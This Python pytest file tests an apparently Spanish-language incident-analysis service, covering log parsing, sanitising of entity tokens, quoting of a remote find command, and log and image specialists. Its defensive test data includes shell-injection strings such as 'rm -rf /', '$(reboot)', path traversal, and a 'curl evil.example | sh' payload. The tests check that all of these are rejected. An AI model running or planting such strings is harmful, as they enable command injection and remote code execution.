import shlex
from datetime import timedelta

import pytest

from app.domain import ImageAttachment, IncidentRequest, VisionRequest
from app.llm import RuleBasedLLM, extract_json
from app.specialists.log_parser import parse_line, parse_many
from app.specialists.log_sources import LocalDirLogSource, build_find_command, entity_token
from app.specialists.logs import LogsSpecialist
from app.specialists.vision import VisionSpecialist
from tests.helpers import NOW, PNG, fatal_line, make_settings, write_log

# --- Parser -----------------------------------------------------------------------------------


def test_parser_extracts_structured_fields():
    entry = parse_line(fatal_line(NOW, message="Call to undefined function x()", file="/var/www/a.php", line=42, n=7))
    assert entry.timestamp == NOW and entry.level == "error"
    assert (entry.file, entry.line) == ("/var/www/a.php", 42)
    assert entry.client_ip == "10.0.0.7" and entry.request == "GET /x HTTP/1.1"


def test_parser_strips_grep_filename_prefix():
    entry = parse_line("./www.acme.error.log.1:" + fatal_line(NOW))
    assert entry is not None and entry.raw.startswith("2026/03/01")


def test_parser_joins_stack_trace_continuations_and_drops_garbage():
    content = fatal_line(NOW) + "\n  #0 /var/www/a.php(10): foo()\n  #1 {main}\nesto no es un log\n" + fatal_line(NOW, n=2)
    entries = parse_many(content)
    assert len(entries) == 2 and "#1 {main}" in entries[0].raw


def test_parser_discards_lines_with_invalid_dates():
    assert parse_line("2026/13/45 99:99:99 [error] 1#1: algo") is None


# --- Token de entidad: viene del texto de un cliente --------------------------------------------


@pytest.mark.parametrize(
    ("entity", "token"),
    [("Grupo Acme", "acme"), ("ACME", "acme"), ("Entidad Ñandú-2", "nandu-2"), (None, None), ("", None)],
)
def test_entity_token_normalizes(entity, token):
    assert entity_token(entity) == token


@pytest.mark.parametrize(
    "hostile",
    ['x"; rm -rf /; "', "$(reboot)", "`id`", "acme;ls", "a b |", "*", "../../etc", "acme.com", "x" * 80, "a", "' OR 1=1"],
)
def test_hostile_entity_never_becomes_a_token(hostile):
    assert entity_token(hostile) is None


def test_remote_command_quotes_every_dynamic_value():
    command = build_find_command("/var/log/my logs; touch /tmp/x", "acme", 2)
    parts = shlex.split(command.split("&&")[0].replace("cd ", "", 1).split(" 2>")[0])
    assert parts == ["/var/log/my logs; touch /tmp/x"]  # el directorio es UN solo argumento
    assert "-iname '*acme*'" in command and "-mmin -120" in command


def test_remote_command_refuses_unvalidated_tokens():
    for bad in ('acme"; id; "', "$(id)", "a b"):
        with pytest.raises(ValueError):
            build_find_command("/var/log", bad, 2)


# --- Fuente local ---------------------------------------------------------------------------


def source(tmp_path):
    return LocalDirLogSource(str(tmp_path / "logs"), now=lambda: NOW.timestamp())


def test_local_source_matches_by_token_recency_and_marker(tmp_path):
    logs = tmp_path / "logs"
    write_log(logs, "www.acme.example.error.log.1", [fatal_line(NOW), "2026/03/01 11:00:00 [warn] 1#1: no fatal"])
    write_log(logs, "www.otro.example.error.log.1", [fatal_line(NOW, n=2)])
    write_log(logs, "www.acme.example.error.log.old", [fatal_line(NOW, n=3)], mtime=NOW - timedelta(hours=5))
    write_log(logs / "preprod", "www.acme.preprod.error.log", [fatal_line(NOW, n=4)])
    write_log(logs, "www.acme.example.access.log", [fatal_line(NOW, n=5)])

    found = source(tmp_path).search_fatal_errors("acme", 2)

    assert len(found) == 1 and "*1 FastCGI" in found[0]


def test_local_source_rejects_unsafe_token(tmp_path):
    with pytest.raises(ValueError):
        source(tmp_path).search_fatal_errors("../etc", 2)


# --- Especialista de logs -----------------------------------------------------------------------


class SpySource:
    def __init__(self, lines):
        self.lines, self.calls = lines, []

    def search_fatal_errors(self, token, hours):
        self.calls.append((token, hours))
        return self.lines


def logs_specialist(tmp_path, lines, **settings):
    spy = SpySource(lines)
    specialist = LogsSpecialist(RuleBasedLLM(), spy, make_settings(tmp_path, **settings), clock=lambda: NOW)
    return specialist, spy


def request(entity="Acme"):
    return IncidentRequest(ticket_id="1", title="Falla", ticket_text="texto", entity=entity)


async def test_hostile_entity_is_rejected_before_touching_the_log_source(tmp_path):
    specialist, spy = logs_specialist(tmp_path, [fatal_line(NOW)])
    result = await specialist.analyze(request('x"; curl evil.example | sh; "'))
    assert spy.calls == [] and result.logs_found == 0
    assert "entidad válida" in result.summary


async def test_filters_lines_outside_the_time_window_by_their_own_timestamp(tmp_path):
    """El archivo se modificó hace poco, pero contiene errores viejos."""
    lines = [fatal_line(NOW - timedelta(hours=5), n=1), fatal_line(NOW - timedelta(minutes=10), n=2)]
    specialist, _ = logs_specialist(tmp_path, lines)
    result = await specialist.analyze(request())
    assert result.logs_found == 1 and "*2 FastCGI" in result.evidence[0]


async def test_individual_diagnosis_for_few_errors(tmp_path):
    lines = [fatal_line(NOW - timedelta(minutes=i), message="Allowed memory size exhausted", n=i) for i in range(1, 4)]
    specialist, _ = logs_specialist(tmp_path, lines)
    result = await specialist.analyze(request())
    assert len(result.diagnoses) == 3 and result.logs_found == 3
    assert "3 errores fatales" in result.summary


async def test_many_errors_are_consolidated_into_one_diagnosis(tmp_path):
    lines = [fatal_line(NOW - timedelta(minutes=i), message="SQLSTATE connection refused", n=i) for i in range(1, 6)]
    specialist, _ = logs_specialist(tmp_path, lines, consolidate_above=3)
    result = await specialist.analyze(request())
    assert len(result.diagnoses) == 1
    assert result.diagnoses[0].summary.startswith("[CONSOLIDADO 5 ERRORES]")


async def test_evidence_is_deduplicated_recent_first_and_chronological(tmp_path):
    same = fatal_line(NOW - timedelta(minutes=30), n=1)
    lines = [same, same] + [fatal_line(NOW - timedelta(minutes=20 - i), n=10 + i) for i in range(8)]
    specialist, _ = logs_specialist(tmp_path, lines, consolidate_above=100)
    result = await specialist.analyze(request())
    assert len(result.evidence) == 5
    assert result.evidence == sorted(result.evidence)  # cronológico
    assert same not in result.evidence  # lo más reciente primero: lo viejo queda fuera


async def test_no_errors_gives_an_informative_empty_result(tmp_path):
    specialist, _ = logs_specialist(tmp_path, [])
    result = await specialist.analyze(request())
    assert result.logs_found == 0 and "No se encontraron" in result.summary


# --- Especialista visual -------------------------------------------------------------------------


def vision(tmp_path, llm=None, **settings):
    return VisionSpecialist(llm or RuleBasedLLM(), make_settings(tmp_path, **settings))


def img(data=PNG, mime="image/png"):
    return ImageAttachment(data=data, mime_type=mime, filename="x")


async def test_vision_analyzes_valid_images_and_skips_invalid_ones(tmp_path):
    result = await vision(tmp_path).diagnose(
        VisionRequest(ticket_text="mira", images=[img(), img(data="%%no-es-base64%%"), img(mime="application/pdf")])
    )
    assert result.status == "ok" and result.skipped_images == 2 and len(result.findings) == 1


async def test_vision_without_valid_images_explains_instead_of_guessing(tmp_path):
    result = await vision(tmp_path).diagnose(VisionRequest(ticket_text="mira", images=[img(data="!!")]))
    assert result.status == "ok" and "No se recibieron imágenes válidas" in result.diagnosis


async def test_vision_skips_oversized_images(tmp_path):
    result = await vision(tmp_path, max_image_bytes=10).diagnose(VisionRequest(ticket_text="mira", images=[img()]))
    assert "No se recibieron imágenes válidas" in result.diagnosis


async def test_vision_never_raises(tmp_path):
    class Broken(RuleBasedLLM):
        async def describe_images(self, text, images):
            raise RuntimeError("secreto interno")

    result = await vision(tmp_path, llm=Broken()).diagnose(VisionRequest(ticket_text="mira", images=[img()]))
    assert result.status == "error" and result.error == "RuntimeError"  # sin filtrar el mensaje


# --- JSON de modelos -------------------------------------------------------------------------------


@pytest.mark.parametrize(
    "raw",
    ['{"a": 1}', '```json\n{"a": 1}\n```', 'Claro, aquí está: {"a": 1} ¡listo!', '{"a": "línea\ncon salto"}'],
)
def test_extract_json_tolerates_model_formatting(raw):
    assert extract_json(raw)["a"] in (1, "línea\ncon salto")


def test_extract_json_raises_without_json():
    with pytest.raises(ValueError):
        extract_json("sin json")
